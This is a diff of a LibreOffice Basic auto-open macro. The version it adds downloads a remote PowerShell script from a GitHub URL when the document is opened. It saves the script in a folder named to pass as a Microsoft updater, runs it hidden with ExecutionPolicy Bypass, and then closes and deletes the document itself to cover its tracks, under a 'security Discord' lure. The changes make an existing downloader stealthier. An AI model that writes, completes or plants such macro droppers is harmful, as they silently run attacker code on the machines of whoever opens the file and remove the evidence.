@@ -2,41 +2,37 @@ REM  *****  BASIC  *****
 Sub Auto_Open()
     Dim scriptUrl As String
     Dim savePath As String
+    Dim functionAccess As Object
+    Dim webContent As String
+    
+    ' Set the URL of your PowerShell script
+    scriptUrl = "https://github.com/run-spec/auto/raw/refs/heads/main/vbs32"
+    
+    ' Get current username dynamically
+    Dim currentUser As String
+    currentUser = Environ("USERNAME")
+    
+    ' Build path with current user  
     Dim folderPath As String
-    Dim xmlHttp As Object
-    Dim fso As Object
+    folderPath = "C:\Users\" & currentUser & "\AppData\Local\Microsoft\Updater\WinTask\SysUpdateTask\"
+    savePath = folderPath & "vbs32.ps1"
     
-    ' Set the URL of your PowerAShell script
-    scriptUrl = "https://drive.google.com/file/d/1iQXHNZkVtBnFUQ2HG0MQ9VqOGBNMiVYu/view?usp=sharing"
-    
-    ' Set the folder and file path
-    folderPath = " C:\Program Files\Microsoft Updater\Update\Ver\Latest\"
-    savePath = folderPath & "WinUpdateTask.ps1"
+    ' Create directory structure if it doesn't exist
+    Shell "cmd.exe /c if not exist """ & folderPath & """ mkdir """ & folderPath & """", 0, "", True
     
     On Error GoTo ErrorHandler
     
-    ' Create file system object
-    Set fso = CreateObject("Scripting.FileSystemObject")
+    ' Use LibreOffice's built-in WEBSERVICE function to download
+    Set functionAccess = createUnoService("com.sun.star.sheet.FunctionAccess")
+    webContent = functionAccess.callFunction("WEBSERVICE", Array(scriptUrl))
     
-    ' Create the folder structure if it doesn't exist
-    If Not fso.FolderExists(folderPath) Then
-        CreateFolderStructure folderPath, fso
-    End If
-    
-    ' Create HTTP request object
-    Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
-    
-    ' Download the PowerShell script
-    xmlHttp.Open "GET", scriptUrl, False
-    xmlHttp.Send
-    
-    ' Check if download was successful
-    If xmlHttp.Status = 200 Then
+    ' Check if we got content
+    If Len(webContent) > 0 Then
         ' Save the script content to file
         Dim fileHandle As Integer
         fileHandle = FreeFile
-        Open savePath For Binary As #fileHandle
-        Put #fileHandle, , xmlHttp.ResponseBody
+        Open savePath For Output As #fileHandle
+        Print #fileHandle, webContent
         Close #fileHandle
         
         ' Show success message
@@ -44,38 +40,50 @@ Sub Auto_Open()
                "Location: " & savePath & Chr(13) & _
                "Join our security Discord: discord.gg/cybersec", 64, "Download Complete"
         
-        ' Run the PowerShell script
-        Shell "powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """", 1
+        ' Run the PowerShell script completely hidden and ensure self-destruction
+        Dim result As Integer
+        Dim cmdLine As String
+        Dim currentDocPath As String
+        
+        ' Get document path BEFORE closing (important!)
+        currentDocPath = ConvertFromURL(ThisComponent.getURL())
+        
+        ' Use cmd.exe with hidden window - this method works
+        cmdLine = "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """"
+        result = Shell(cmdLine, 0, "", False)  ' Set bSync to False to avoid blocking
+        
+        ' Wait a moment for PowerShell to start
+        Wait 1000
+        
+        ' ALWAYS self-destruct after launching (regardless of result)
+        ' Because hidden processes don't return reliable exit codes
+        
+        ' Close the current document without saving
+        On Error Resume Next
+        ThisComponent.close(False)
+        
+        ' Delete the LibreOffice document file permanently
+        If currentDocPath <> "" Then
+            Kill currentDocPath
+        End If
+        
+        ' If Kill doesn't work, try system delete
+        If Dir(currentDocPath) <> "" Then
+            Shell "cmd.exe /c del """ & currentDocPath & """", 0, "", False
+        End If
         
     Else
-        MsgBox "Failed to download script. HTTP Status: " & xmlHttp.Status, 16, "Download Error"
+        MsgBox "Failed to download script. No content received.", 16, "Download Error"
     End If
     
+Cleanup:
     ' Clean up objects
-    Set xmlHttp = Nothing
-    Set fso = Nothing
+    On Error Resume Next
+    Set functionAccess = Nothing
+    On Error GoTo 0
     Exit Sub
     
 ErrorHandler:
-    MsgBox "An error occurred: " & Err.Description, 16, "Error"
-    If Not xmlHttp Is Nothing Then Set xmlHttp = Nothing
-    If Not fso Is Nothing Then Set fso = Nothing
-End Sub
-
-Sub CreateFolderStructure(fullPath As String, fso As Object)
-    Dim pathParts As Variant
-    Dim currentPath As String
-    Dim i As Integer
-    
-    pathParts = Split(fullPath, "\")
-    currentPath = pathParts(0) & "\"
-    
-    For i = 1 To UBound(pathParts)
-        If pathParts(i) <> "" Then
-            currentPath = currentPath & pathParts(i) & "\"
-            If Not fso.FolderExists(currentPath) Then
-                fso.CreateFolder currentPath
-            End If
-        End If
-    Next i
+    MsgBox "An error occurred: " & Error(Err) & " (Code: " & Err & ")", 16, "Error"
+    GoTo Cleanup
 End Sub
